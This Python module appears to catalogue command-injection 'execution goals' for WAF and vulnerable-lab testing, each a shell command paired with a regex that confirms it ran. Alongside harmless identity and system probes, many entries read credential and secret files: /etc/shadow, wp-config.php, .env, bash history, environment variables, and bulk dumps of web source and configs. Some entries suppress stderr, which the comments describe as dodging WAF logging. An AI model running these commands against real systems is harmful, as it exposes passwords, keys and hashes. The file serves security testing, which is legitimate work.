"""
Execution goal catalog for command injection validation.

Categories:
  - identity:   user/group identity (whoami, id)
  - system:     OS/hardware info (uname, /proc/*, df, free)
  - env:        environment variables
  - output:     controlled canary output
  - file:       file content reading (cat passwd/shadow/hosts/web-config/*.conf)
  - dir:        directory listing (ls, find)
  - process:    process listing (ps, netstat)
  - network:    local-only network probes (curl localhost, ifconfig, ping local)

ALL goals are strictly read-only: no writes, deletes, modifications,
downloads, reverse shells, or persistence mechanisms.
"""

from __future__ import annotations

EXECUTION_GOAL_CATALOG: dict[str, dict] = {
    # =========================================================================
    # Identity goals
    # =========================================================================
    "identity:whoami": {
        "command": "whoami",
        "category": "身份信息",
        "verification": {
            "type": "regex",
            "pattern": r"uid=\d+|root|www-data|daemon|nobody|admin|nt authority",
            "description": "whoami/id 输出当前用户名",
        },
        "prerequisites": ["Unix-like OS or Windows", "whoami or id in PATH"],
    },
    "identity:id": {
        "command": "id",
        "category": "身份信息",
        "verification": {
            "type": "regex",
            "pattern": r"uid=\d+\([^)]+\)",
            "description": "id 显示 uid 及用户名，格式 uid=0(root) gid=0(root)",
        },
        "prerequisites": ["Unix-like OS", "id in PATH"],
    },

    # =========================================================================
    # System info goals
    # =========================================================================
    "system:uname": {
        "command": "uname -a",
        "category": "系统信息",
        "verification": {
            "type": "regex",
            "pattern": r"Linux|GNU|Darwin|Windows|BSD",
            "description": "uname 输出操作系统族名",
        },
        "prerequisites": ["uname in PATH"],
    },
    "system:hostname": {
        "command": "hostname",
        "category": "系统信息",
        "verification": {
            "type": "regex",
            "pattern": r".+",
            "description": "hostname 返回非空主机名",
        },
        "prerequisites": ["hostname in PATH"],
    },
    "system:pwd": {
        "command": "pwd",
        "category": "系统信息",
        "verification": {
            "type": "regex",
            "pattern": r"^/|^[A-Z]:\\",
            "description": "pwd 返回绝对路径",
        },
        "prerequisites": ["pwd in PATH"],
    },
    "system:cpuinfo": {
        "command": "cat /proc/cpuinfo",
        "category": "系统信息",
        "verification": {
            "type": "regex",
            "pattern": r"model\s+name|cpu\s+MHz|processor\s*:",
            "description": "/proc/cpuinfo 包含 CPU 型号/频率/核心数",
        },
        "prerequisites": ["Linux OS", "/proc filesystem"],
    },
    "system:meminfo": {
        "command": "cat /proc/meminfo",
        "category": "系统信息",
        "verification": {
            "type": "regex",
            "pattern": r"MemTotal|MemFree|MemAvailable",
            "description": "/proc/meminfo 包含内存总量/可用/空闲信息",
        },
        "prerequisites": ["Linux OS", "/proc filesystem"],
    },
    "system:version": {
        "command": "cat /proc/version",
        "category": "系统信息",
        "verification": {
            "type": "regex",
            "pattern": r"Linux\s+version",
            "description": "/proc/version 包含内核版本和 GCC 版本信息",
        },
        "prerequisites": ["Linux OS", "/proc filesystem"],
    },
    "system:df": {
        "command": "df -h",
        "category": "系统信息",
        "verification": {
            "type": "regex",
            "pattern": r"(?:/dev/|Filesystem)\s+.*\d+[GM]",
            "description": "df -h 输出挂载点及磁盘使用量",
        },
        "prerequisites": ["Unix-like OS", "df in PATH"],
    },
    "system:free": {
        "command": "free -m",
        "category": "系统信息",
        "verification": {
            "type": "regex",
            "pattern": r"Mem:|Swap:|total\s+used\s+free",
            "description": "free -m 输出内存和交换分区使用量（MB）",
        },
        "prerequisites": ["Unix-like OS", "free in PATH"],
    },
    "system:lsb-release": {
        "command": "cat /etc/os-release",
        "category": "系统信息",
        "verification": {
            "type": "regex",
            "pattern": r"PRETTY_NAME=|NAME=|VERSION=",
            "description": "/etc/os-release 包含发行版名称和版本",
        },
        "prerequisites": ["Linux OS"],
    },

    # =========================================================================
    # Environment goals
    # =========================================================================
    "env:path": {
        "command": "echo $PATH",
        "category": "环境状态",
        "verification": {
            "type": "regex",
            "pattern": r"/bin|/usr|\\|;",
            "description": "PATH 包含可执行文件搜索路径",
        },
        "prerequisites": ["Shell with $PATH"],
    },
    "env:shell": {
        "command": "echo $SHELL",
        "category": "环境状态",
        "verification": {
            "type": "regex",
            "pattern": r"/bin/|cmd|powershell",
            "description": "SHELL 指向当前 Shell 路径",
        },
        "prerequisites": ["Shell with $SHELL"],
    },
    "env:home": {
        "command": "echo $HOME",
        "category": "环境状态",
        "verification": {
            "type": "regex",
            "pattern": r"^/|^[A-Z]:\\",
            "description": "HOME 是绝对路径",
        },
        "prerequisites": ["Shell with $HOME"],
    },
    "env:env-all": {
        "command": "env",
        "category": "环境状态",
        "verification": {
            "type": "regex",
            "pattern": r"\w+=",
            "description": "env 输出全部环境变量，含数据库密码、API密钥等敏感信息",
        },
        "prerequisites": ["Unix-like OS", "env in PATH"],
    },

    # =========================================================================
    # Output / canary goals (controlled marker)
    # =========================================================================
    "output:canary": {
        "command": "echo {CANARY}",
        "category": "受控输出",
        "verification": {
            "type": "marker",
            "marker": "{CANARY}",
            "description": "响应中必须包含 Canary 标记字符串",
        },
        "placeholders": {"{CANARY}": None},
        "prerequisites": ["Shell with echo builtin"],
    },
    "output:uptime": {
        "command": "uptime",
        "category": "受控输出",
        "verification": {
            "type": "regex",
            "pattern": r"load average|up\s+\d+|up\s+\d+\s+min|up\s+\d+\s+day",
            "description": "uptime 输出系统运行时间和负载",
        },
        "prerequisites": ["Unix-like OS", "uptime in PATH"],
    },
    "output:date": {
        "command": "date",
        "category": "受控输出",
        "verification": {
            "type": "regex",
            "pattern": r"\d{4}",
            "description": "date 输出包含 4 位年份",
        },
        "prerequisites": ["date in PATH"],
    },

    # =========================================================================
    # File reading goals (READ-ONLY — no writes, deletes, or modifications)
    # =========================================================================
    "file:passwd": {
        "command": "cat /etc/passwd",
        "category": "文件读取",
        "verification": {
            "type": "regex",
            "pattern": r"root:x:0:0:|(?:root|daemon|bin|sys|www-data|nobody):[^:]*:[^:]*:[^:]*:",
            "description": "/etc/passwd 包含 Unix 用户账户列表（root:x:0:0: 标准格式）",
        },
        "prerequisites": ["Unix-like OS", "cat in PATH"],
    },
    "file:shadow": {
        "command": "cat /etc/shadow",
        "category": "文件读取",
        "verification": {
            "type": "regex",
            "pattern": r"root:\$|root:!|root:\*|root::",
            "description": "/etc/shadow 包含加密密码哈希（root:$6$ 或 root:! 格式）",
        },
        "prerequisites": ["Unix-like OS", "cat in PATH", "privileged access for /etc/shadow"],
    },
    "file:hosts": {
        "command": "cat /etc/hosts",
        "category": "文件读取",
        "verification": {
            "type": "regex",
            "pattern": r"127\.0\.0\.1|localhost|::1",
            "description": "/etc/hosts 包含本地回环地址和主机名映射",
        },
        "prerequisites": ["Unix-like OS", "cat in PATH"],
    },
    "file:group": {
        "command": "cat /etc/group",
        "category": "文件读取",
        "verification": {
            "type": "regex",
            "pattern": r"root:x:0:|(?:root|adm|sudo|wheel|admin|docker):[^:]*:[^:]*:",
            "description": "/etc/group 包含 Unix 用户组列表及成员",
        },
        "prerequisites": ["Unix-like OS", "cat in PATH"],
    },
    "file:nginx-conf": {
        "command": "cat /etc/nginx/nginx.conf",
        "category": "文件读取",
        "verification": {
            "type": "regex",
            "pattern": r"(?:server\s*{|listen\s+\d+|location\s+/)",
            "description": "Nginx 主配置文件包含 server/listen/location 指令",
        },
        "prerequisites": ["Nginx installed", "cat in PATH"],
    },
    "file:apache-conf": {
        "command": "cat /etc/apache2/apache2.conf",
        "category": "文件读取",
        "verification": {
            "type": "regex",
            "pattern": r"(?:<Directory|<VirtualHost|ServerRoot|Listen\s+\d+)",
            "description": "Apache 主配置文件包含 Directory/VirtualHost 等指令",
        },
        "prerequisites": ["Apache installed", "cat in PATH"],
    },
    "file:my-cnf": {
        "command": "cat /etc/my.cnf",
        "category": "文件读取",
        "verification": {
            "type": "regex",
            "pattern": r"\[mysqld\]|\[client\]|datadir|socket|password",
            "description": "MySQL/MariaDB 配置文件包含数据目录、Socket 路径及可能的密码",
        },
        "prerequisites": ["MySQL/MariaDB installed", "cat in PATH"],
    },
    "file:php-ini": {
        "command": "cat /etc/php/php.ini",
        "category": "文件读取",
        "verification": {
            "type": "regex",
            "pattern": r"disable_functions|open_basedir|allow_url_include|extension_dir",
            "description": "php.ini 包含安全限制配置（disable_functions/open_basedir）",
        },
        "prerequisites": ["PHP installed", "cat in PATH"],
    },
    "file:ssh-config": {
        "command": "cat /etc/ssh/sshd_config",
        "category": "文件读取",
        "verification": {
            "type": "regex",
            "pattern": r"Port\s+\d+|PermitRootLogin|PasswordAuthentication",
            "description": "SSH 服务端配置包含端口、Root 登录策略、密码认证设置",
        },
        "prerequisites": ["SSH server installed", "cat in PATH"],
    },
    "file:web-config": {
        "command": "find /var/www -name 'config.php' -exec cat {} \\;",
        "category": "文件读取",
        "verification": {
            "type": "combo",
            "pattern": r"DB_|database|password|host|user",
            "description": "Web 应用数据库配置文件通常包含 DB_HOST/DB_PASSWORD 等常量",
        },
        "prerequisites": ["PHP web app on Linux", "find/cat in PATH"],
    },
    "file:wp-config": {
        "command": "cat /var/www/wp-config.php",
        "category": "文件读取",
        "verification": {
            "type": "regex",
            "pattern": r"DB_NAME|DB_USER|DB_PASSWORD|AUTH_KEY",
            "description": "WordPress 配置文件包含数据库凭证和安全密钥",
        },
        "prerequisites": ["WordPress installed at /var/www", "cat in PATH"],
    },
    "file:env-file": {
        "command": "cat /var/www/.env",
        "category": "文件读取",
        "verification": {
            "type": "regex",
            "pattern": r"APP_|DB_|MAIL_|REDIS_|SECRET|KEY|TOKEN",
            "description": "Laravel/Symfony .env 文件包含应用密钥和数据库/邮件/Redis 凭证",
        },
        "prerequisites": ["Web app with .env file", "cat in PATH"],
    },
    "file:bash-history": {
        "command": "cat ~/.bash_history",
        "category": "文件读取",
        "verification": {
            "type": "regex",
            "pattern": r".+",
            "description": "用户 Bash 历史记录包含最近执行的所有命令",
        },
        "prerequisites": ["Unix-like OS", "~/.bash_history exists"],
    },
    "file:crontab": {
        "command": "cat /etc/crontab",
        "category": "文件读取",
        "verification": {
            "type": "regex",
            "pattern": r"\d+\s+\d+\s+\*|SHELL=|PATH=",
            "description": "系统 crontab 包含定时任务和 Shell 路径设置",
        },
        "prerequisites": ["Unix-like OS", "cat in PATH"],
    },

    # =========================================================================
    # Directory listing goals (READ-ONLY)
    # =========================================================================
    "dir:list-etc": {
        "command": "ls -la /etc",
        "category": "目录列表",
        "verification": {
            "type": "regex",
            "pattern": r"total\s+\d+|drwx|---|passwd|shadow|hosts|cron",
            "description": "ls -la /etc 列出 /etc 目录下所有文件和权限",
        },
        "prerequisites": ["Unix-like OS", "ls in PATH"],
    },
    "dir:list-www": {
        "command": "ls -la /var/www",
        "category": "目录列表",
        "verification": {
            "type": "regex",
            "pattern": r"total\s+\d+|drwx|---|html|www",
            "description": "ls -la /var/www 列出 Web 根目录下的文件和子目录",
        },
        "prerequisites": ["Unix-like OS", "ls in PATH"],
    },
    "dir:list-home": {
        "command": "ls -la /home",
        "category": "目录列表",
        "verification": {
            "type": "regex",
            "pattern": r"total\s+\d+|drwx|---",
            "description": "ls -la /home 列出所有用户家目录",
        },
        "prerequisites": ["Unix-like OS", "ls in PATH"],
    },
    "dir:list-root": {
        "command": "ls -la /",
        "category": "目录列表",
        "verification": {
            "type": "regex",
            "pattern": r"total\s+\d+|drwx|bin\s|boot\s|dev\s|etc\s|home\s|root\s",
            "description": "ls -la / 列出文件系统根目录结构",
        },
        "prerequisites": ["Unix-like OS", "ls in PATH"],
    },
    "dir:find-php": {
        "command": "find /var/www -name '*.php'",
        "category": "目录列表",
        "verification": {
            "type": "regex",
            "pattern": r"\.php",
            "description": "find /var/www -name '*.php' 列出 Web 根目录下所有 PHP 文件",
        },
        "prerequisites": ["Unix-like OS", "find in PATH"],
    },
    "dir:find-conf": {
        "command": "find /etc -name '*.conf'",
        "category": "目录列表",
        "verification": {
            "type": "regex",
            "pattern": r"\.conf",
            "description": "find /etc -name '*.conf' 列出 /etc 下所有 .conf 配置文件",
        },
        "prerequisites": ["Unix-like OS", "find in PATH"],
    },
    "dir:find-suid": {
        "command": "find / -perm -4000 -type f 2>/dev/null",
        "category": "目录列表",
        "verification": {
            "type": "regex",
            "pattern": r"/usr/bin/|/bin/|/sbin/",
            "description": "find / -perm -4000 列出所有 SUID 位文件（常用于提权审计）",
        },
        "prerequisites": ["Unix-like OS", "find in PATH"],
    },

    # =========================================================================
    # Process listing goals (READ-ONLY)
    # =========================================================================
    "process:ps-aux": {
        "command": "ps aux",
        "category": "进程列表",
        "verification": {
            "type": "regex",
            "pattern": r"USER\s+PID\s+|root\s+\d+|www-data\s+\d+|nginx|apache|mysql|php",
            "description": "ps aux 列出所有进程及运行用户，可识别 Web/DB 服务进程",
        },
        "prerequisites": ["Unix-like OS", "ps in PATH"],
    },
    "process:ps-ef": {
        "command": "ps -ef",
        "category": "进程列表",
        "verification": {
            "type": "regex",
            "pattern": r"UID\s+PID\s+|root\s+\d+|www-data\s+\d+|nginx|apache",
            "description": "ps -ef 以完整格式列出所有进程（System V 风格）",
        },
        "prerequisites": ["Unix-like OS", "ps in PATH"],
    },
    "process:netstat": {
        "command": "netstat -tlnp",
        "category": "进程列表",
        "verification": {
            "type": "regex",
            "pattern": r"tcp\s+\d+\s+\d+|LISTEN|0\.0\.0\.0:\d+|:::\d+",
            "description": "netstat -tlnp 列出所有 TCP 监听端口及其绑定进程",
        },
        "prerequisites": ["Unix-like OS", "netstat or ss in PATH"],
    },

    # =========================================================================
    # Local network probing goals (READ-ONLY, localhost only)
    # =========================================================================
    "network:ifconfig": {
        "command": "ifconfig",
        "category": "网络探测",
        "verification": {
            "type": "regex",
            "pattern": r"inet\s+(?:addr:)?\d+\.\d+\.\d+\.\d+|ether\s+[0-9a-f:]+",
            "description": "ifconfig 列出所有网络接口 IP 和 MAC 地址",
        },
        "prerequisites": ["Unix-like OS", "ifconfig or ip in PATH"],
    },
    "network:curl-localhost": {
        "command": "curl -s http://127.0.0.1",
        "category": "网络探测",
        "verification": {
            "type": "regex",
            "pattern": r"<html|<body|<head|<title|HTTP/|DOCTYPE",
            "description": "curl 127.0.0.1 返回本地 Web 服务的 HTML 响应头/内容",
        },
        "prerequisites": ["curl in PATH", "让 WAF 学习本地回环请求的响应特征"],
    },
    "network:wget-localhost": {
        "command": "wget -qO- http://127.0.0.1",
        "category": "网络探测",
        "verification": {
            "type": "regex",
            "pattern": r"<html|<body|<head|<title|DOCTYPE",
            "description": "wget -qO- 127.0.0.1 返回本地 Web 服务的 HTML 内容",
        },
        "prerequisites": ["wget in PATH"],
    },
    "network:ping-local": {
        "command": "ping -c 1 127.0.0.1",
        "category": "网络探测",
        "verification": {
            "type": "regex",
            "pattern": r"1\s+packets\s+transmitted|1\s+received|ttl=|bytes\s+from",
            "description": "ping -c 1 127.0.0.1 验证本地网络栈是否可达",
        },
        "prerequisites": ["ping in PATH"],
    },
    "network:arp": {
        "command": "arp -a",
        "category": "网络探测",
        "verification": {
            "type": "regex",
            "pattern": r"\d+\.\d+\.\d+\.\d+\s+at\s+[0-9a-f:]+|\(.*\)\s+at\s+[0-9a-f:]+",
            "description": "arp -a 列出 ARP 缓存表，含 IP-MAC 映射",
        },
        "prerequisites": ["Unix-like OS", "arp in PATH"],
    },

    # =========================================================================
    # Compound file-reading goals (find + cat chain, stderr suppression)
    # These are the most realistic attack patterns for WAF capability testing.
    # =========================================================================
    "file:cat-passwd-2null": {
        "command": "cat /etc/passwd 2>/dev/null",
        "category": "文件读取",
        "verification": {
            "type": "regex",
            "pattern": r"root:x:0:0:|(?:root|daemon|bin|sys):[^:]*:[^:]*:[^:]*:",
            "description": "cat /etc/passwd 并抑制 stderr，WAF 无法通过错误日志检测到失败尝试",
        },
        "prerequisites": ["Unix-like OS", "cat in PATH"],
    },
    "file:head-passwd": {
        "command": "head -3 /etc/passwd",
        "category": "文件读取",
        "verification": {
            "type": "regex",
            "pattern": r"root:x:0:0:",
            "description": "head -3 仅读取 passwd 前 3 行，输出简短不易被 WAF 截断",
        },
        "prerequisites": ["Unix-like OS", "head in PATH"],
    },
    "file:tail-shadow": {
        "command": "tail -3 /etc/shadow 2>/dev/null",
        "category": "文件读取",
        "verification": {
            "type": "regex",
            "pattern": r".*:.*:.*:.*:.*:.*:.*:.*:",
            "description": "tail -3 /etc/shadow 读取 shadow 末尾 3 行，stderr 抑制",
        },
        "prerequisites": ["Unix-like OS", "tail in PATH"],
    },
    "dir:find-cat-php": {
        "command": "find /var/www -name '*.php' | xargs cat 2>/dev/null",
        "category": "文件读取",
        "verification": {
            "type": "regex",
            "pattern": r"<\?php|<\?=|<\? |function\s+\w+\s*\(|class\s+\w+",
            "description": "find *.php | xargs cat 批量读取所有 PHP 源码，可发现数据库凭证、API 密钥等敏感信息",
        },
        "prerequisites": ["Unix-like OS", "find/xargs/cat in PATH"],
    },
    "dir:find-exec-php": {
        "command": "find /var/www -name '*.php' -exec cat {} + 2>/dev/null",
        "category": "文件读取",
        "verification": {
            "type": "regex",
            "pattern": r"<\?php|<\?=|function\s+\w+\s*\(|class\s+\w+",
            "description": "find -exec cat {} + 读取所有 PHP 文件（比 xargs 更高效），stderr 抑制",
        },
        "prerequisites": ["Unix-like OS", "find/cat in PATH"],
    },
    "dir:find-cat-conf": {
        "command": "find /etc -name '*.conf' | xargs cat 2>/dev/null",
        "category": "文件读取",
        "verification": {
            "type": "regex",
            "pattern": r"\[.*\]|\w+\s*=\s*\w+|server\s*{|listen\s+\d+",
            "description": "find *.conf | xargs cat 批量读取 /etc 下所有配置文件",
        },
        "prerequisites": ["Unix-like OS", "find/xargs/cat in PATH"],
    },
    "dir:find-exec-conf": {
        "command": "find /etc -name '*.conf' -exec cat {} + 2>/dev/null",
        "category": "文件读取",
        "verification": {
            "type": "regex",
            "pattern": r"\[.*\]|\w+\s*=\s*\w+|server\s*{|listen\s+\d+",
            "description": "find -exec cat {} + 批量读取 /etc 下所有配置文件，stderr 抑制",
        },
        "prerequisites": ["Unix-like OS", "find/cat in PATH"],
    },
    "process:ps-grep-web": {
        "command": "ps aux | grep -E 'nginx|apache|mysql|php|java|node|python'",
        "category": "进程列表",
        "verification": {
            "type": "regex",
            "pattern": r"(?:nginx|apache|mysql|php|java|node|python|httpd)",
            "description": "ps aux | grep 过滤出 Web/数据库/应用服务进程，直接识别运行栈",
        },
        "prerequisites": ["Unix-like OS", "ps/grep in PATH"],
    },
    "process:ss-tlnp": {
        "command": "ss -tlnp 2>/dev/null",
        "category": "进程列表",
        "verification": {
            "type": "regex",
            "pattern": r"LISTEN\s+\d+\s+|tcp\s+LISTEN",
            "description": "ss -tlnp 列出所有监听端口（现代版 netstat），stderr 抑制",
        },
        "prerequisites": ["Linux OS", "ss or netstat in PATH"],
    },
    "dir:find-all-web-files": {
        "command": "find /var/www -type f \\( -name '*.php' -o -name '*.asp' -o -name '*.jsp' -o -name '*.py' -o -name '*.rb' -o -name '*.conf' -o -name '.env' \\) 2>/dev/null | xargs cat 2>/dev/null",
        "category": "文件读取",
        "verification": {
            "type": "regex",
            "pattern": r"<\?php|<\?=|function\s+\w+\s*\(|DB_|APP_|SECRET|KEY",
            "description": "find 多种 Web 文件类型 + xargs cat 全面搜索，双 stderr 抑制，最全面的 Web 源码读取",
        },
        "prerequisites": ["Unix-like OS", "find/xargs/cat in PATH"],
    },
}

# Legacy marker pattern for backward compatibility
LEGACY_MARKER_PATTERN = r"[A-Z][A-Z0-9_]{2,}_OK"

# ---------------------------------------------------------------------------
# Target-based goal filtering
# ---------------------------------------------------------------------------
WINDOWS_GOAL_IDS = frozenset({
    "identity:whoami", "system:hostname", "system:pwd",
    "output:canary", "output:date",
    "env:path", "env:env-all",
    "dir:list-root",
    "network:ping-local", "network:arp",
})

UNIX_GOAL_IDS = frozenset(EXECUTION_GOAL_CATALOG.keys())

ALL_GOAL_IDS = frozenset(EXECUTION_GOAL_CATALOG.keys())

# ---------------------------------------------------------------------------
# HIGH-IMPACT goals: file reads, process lists, network probes
# These are the most effective for WAF capability testing.
# ---------------------------------------------------------------------------
HIGH_IMPACT_GOAL_IDS = frozenset({
    "file:passwd", "file:shadow", "file:hosts", "file:my-cnf",
    "file:php-ini", "file:web-config", "file:wp-config", "file:env-file",
    "file:bash-history", "file:ssh-config", "file:nginx-conf",
    "dir:find-suid", "dir:find-conf",
    "process:ps-aux", "process:netstat",
    "network:curl-localhost", "network:ifconfig",
    "env:env-all",
})

# ---------------------------------------------------------------------------
# Public helpers
# ---------------------------------------------------------------------------


def goals_for_target(target: str) -> list[str]:
    """Return applicable goal IDs based on target platform."""
    target_lower = target.lower()
    if target_lower in ("dvwa", "pikachu", "通用"):
        return sorted(UNIX_GOAL_IDS)
    if target_lower == "windows":
        return sorted(WINDOWS_GOAL_IDS)
    return sorted(ALL_GOAL_IDS)


def normalize_execution_goal_id(goal_id: str) -> str:
    """Normalize harmless LLM formatting and unambiguous tail truncation.

    Models occasionally omit the final one or two characters of an otherwise
    exact catalog ID (for example ``file:passw``). Only a unique catalog prefix
    with at most two missing trailing characters is repaired. Typos, ambiguous
    prefixes and larger truncations remain invalid and are returned unchanged
    for the caller to reject.
    """
    normalized = "".join(goal_id.split()).lower()
    if normalized in EXECUTION_GOAL_CATALOG:
        return normalized

    matches = [
        candidate
        for candidate in EXECUTION_GOAL_CATALOG
        if candidate.startswith(normalized)
        and 1 <= len(candidate) - len(normalized) <= 2
    ]
    return matches[0] if len(matches) == 1 else normalized


def verification_for_goal(goal_id: str, placeholders: dict[str, str] | None = None) -> dict:
    """Resolve a goal's verification spec, substituting any placeholders."""
    goal = EXECUTION_GOAL_CATALOG.get(goal_id)
    if not goal:
        raise ValueError(f"Unknown execution goal: {goal_id}")
    spec = dict(goal["verification"])
    if placeholders:
        for key, val in placeholders.items():
            if spec.get("type") == "marker":
                spec["marker"] = spec["marker"].replace(key, val)
            spec["pattern"] = spec.get("pattern", "").replace(key, val) if spec.get("pattern") else ""
    return spec


def goal_category(goal_id: str) -> str:
    """Return the human-readable category for a goal ID."""
    return EXECUTION_GOAL_CATALOG[goal_id]["category"]


def goal_command(goal_id: str) -> str:
    """Return the shell command for a goal ID."""
    return EXECUTION_GOAL_CATALOG[goal_id]["command"]
